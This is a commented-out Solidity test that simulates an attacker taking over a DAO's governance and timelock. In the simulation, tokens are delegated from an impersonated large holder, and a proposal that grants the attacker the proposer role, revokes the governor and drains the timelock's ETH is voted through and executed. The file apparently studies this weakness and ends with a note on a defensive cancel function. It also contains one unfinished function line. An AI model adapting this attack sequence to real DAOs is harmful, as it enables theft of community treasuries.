// // SPDX-License-Identifier: UNLICENSED
// pragma solidity ^0.8.13;

// import { IGovernor } from "../../src/interfaces/IGovernor.sol";
// import { IToken } from "../../src/interfaces/IToken.sol";
// import { ITimelock } from "../../src/interfaces/ITimelock.sol";

// contract GovernorUtils {

//     function propose(address proposer, )
//     function test_BaseConfigChecks() public {
//         address tokenInGovernor = governor.token();
//         assertEq(tokenInGovernor, address(token));

//         bool governorIsProposer = timelock.hasRole(PROPOSER_ROLE, address(governor));
//         assertTrue(governorIsProposer);
//     }

//     function test_AttackDAO() public {
//         // Delegate from top token holder (binance, with 4m $ENS in this case)
//         vm.prank(0x5a52E96BAcdaBb82fd05763E25335261B270Efcb);
//         token.delegate(attacker);

//         uint256 votingPower = token.getVotes(attacker);
//         assertEq(votingPower, 4_126_912_192_000_000_000_000_000);

//         // Need to advance 1 block for delegation to be valid on governor
//         vm.roll(block.number + 1);

//         // Creating a proposal that gives a proposer role to
//         address[] memory targets = new address[](3);
//         targets[0] = address(timelock);
//         targets[1] = address(timelock);
//         targets[2] = attacker;
//         uint256[] memory values = new uint256[](3);
//         values[0] = 0;
//         values[1] = 0;
//         values[2] = 5_370_845_482_402_118_767_544;
//         bytes[] memory calldatas = new bytes[](3);
//         calldatas[0] = abi.encodeCall(timelock.grantRole, (timelock.PROPOSER_ROLE(), attacker));
//         calldatas[1] = abi.encodeCall(timelock.revokeRole, (timelock.PROPOSER_ROLE(), address(governor)));
//         calldatas[2] = bytes("");

//         string memory description = "";
//         bytes32 descriptionHash = keccak256(bytes(description));

//         // Governor //
//         // Submit malicious proposal
//         vm.prank(attacker);
//         uint256 proposalId = governor.propose(targets, values, calldatas, description);
//         assertEq(governor.state(proposalId), 0);

//         // Proposal is ready to vote after 2 block because of the revert ERC20Votes: block not yet mined
//         vm.roll(block.number + governor.votingDelay() + 1);
//         assertEq(governor.state(proposalId), 1);

//         // Vote for the proposal
//         vm.prank(attacker);
//         governor.castVote(proposalId, 1);

//         // Let the voting end
//         vm.roll(block.number + governor.votingPeriod());
//         assertEq(governor.state(proposalId), 4);

//         // Queue the proposal to be executed
//         governor.queue(targets, values, calldatas, descriptionHash);
//         assertEq(governor.state(proposalId), 5);

//         // Calculate proposalId in timelock
//         bytes32 proposalIdInTimelock = timelock.hashOperationBatch(targets, values, calldatas, 0, descriptionHash);
//         assertTrue(timelock.isOperationPending(proposalIdInTimelock));

//         // Wait the operation in the DAO wallet timelock to be Ready
//         vm.warp(block.timestamp + timelock.getMinDelay() + 1);
//         assertTrue(timelock.isOperationReady(proposalIdInTimelock));

//         // Execute proposal
//         governor.execute(targets, values, calldatas, descriptionHash);
//         assertTrue(timelock.isOperationDone(proposalIdInTimelock));

//         // Check result
//         assertTrue(timelock.hasRole(PROPOSER_ROLE, attacker));
//         assertFalse(timelock.hasRole(PROPOSER_ROLE, address(governor)));
//         assertEq(address(timelock).balance, 0);

//         // NOTE: is timelock useless if there is no way to cancel it.
//         // A solution could be a cancel function called by a major delegate that pauses
//         // the timelock for a urgent voting?
//     }

//     /// @dev Labels the most relevant addresses.
//     function labelAddresses() internal {
//         vm.label({ account: attacker, newLabel: "attacker" });
//         vm.label({ account: address(governor), newLabel: "governor" });
//         vm.label({ account: address(timelock), newLabel: "timelock" });
//         vm.label({ account: address(token), newLabel: "token" });
//     }
// }
